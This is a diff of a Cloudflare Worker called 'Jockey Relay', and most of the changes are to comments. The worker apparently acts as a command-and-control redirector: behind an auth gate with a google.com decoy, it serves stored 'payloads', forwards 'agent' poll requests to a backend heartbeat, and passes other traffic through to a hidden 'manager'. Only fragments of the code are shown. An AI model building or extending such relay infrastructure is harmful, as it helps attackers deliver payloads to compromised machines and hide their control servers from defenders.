@@ -1,5 +1,9 @@
 // ============================================================================
-// Jockey Relay ? Cloudflare Worker (short-poll, no loop)
+// Jockey Relay — Cloudflare Worker (short-poll)
+//   • Auth gate
+//   • /payloads/<name>       — serve from KV
+//   • /api/v1/agent/poll     — single forward to backend /heartbeat
+//   • everything else        — pass-through to manager
 // ============================================================================
 
 const DECOY_URL = "https://www.google.com";
@@ -17,7 +21,6 @@ export default {
     const url  = new URL(request.url);
     const path = url.pathname;
 
-    // ---- Payloads ----
     if (path.startsWith("/payloads/")) {
       const name = path.replace("/payloads/", "");
       const payload = await env.PAYLOAD_KV.get(name, { type: "arrayBuffer" });
@@ -30,7 +33,6 @@ export default {
       });
     }
 
-    // ---- Agent poll ? single forward to backend /heartbeat ----
     if (path === "/api/v1/agent/poll" && request.method === "POST") {
       let body;
       try { body = await request.json(); }
@@ -67,7 +69,6 @@ export default {
       }
     }
 
-    // ---- Pass-through ----
     const backendUrl = env.BACKEND_URL + url.pathname + url.search;
     const init = { method: request.method, headers: request.headers };
     if (!["GET", "HEAD"].includes(request.method)) {
